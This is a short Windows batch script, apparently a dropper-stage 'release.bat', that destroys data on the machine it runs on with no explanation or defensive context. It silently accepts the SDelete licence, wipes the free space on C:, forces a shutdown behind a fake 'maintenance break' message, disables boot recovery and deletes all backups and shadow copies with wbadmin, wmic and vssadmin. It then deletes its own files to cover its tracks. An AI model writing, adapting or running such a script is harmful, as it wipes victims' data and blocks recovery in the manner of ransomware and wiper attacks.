:: [Version 2.0.7]

REM [Echo OFF]
@echo off

REM [Microsoft Sysinternals Eula Accepted]
REG ADD "HKEY_CURRENT_USER\Software\Sysinternals\SDelete"
REG ADD "HKEY_CURRENT_USER\Software\Sysinternals\SDelete" /v EulaAccepted /t REG_DWORD /d 1 /f

REM [Wipe Drives Free Space]
cmd.exe /c C:\ProgramData\sdelete.exe -c -z C:

REM [Start SYSTEM Shutdown Timer]
shutdown /S /F /T 300 /C "Unexpected shutdown due to maintenance break."

REM [Disable Safe Boot]
bcdedit /set {default} recoveryenabled No
bcdedit /set {default} bootstatuspolicy ignoreallfailures

REM [Delete Backups]
wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0
wmic SHADOWCOPY DELETE
vssadmin delete shadows /All

REM [Delete Temp Files]
del C:\ProgramData\sdelete.exe
del C:\ProgramData\release.bat
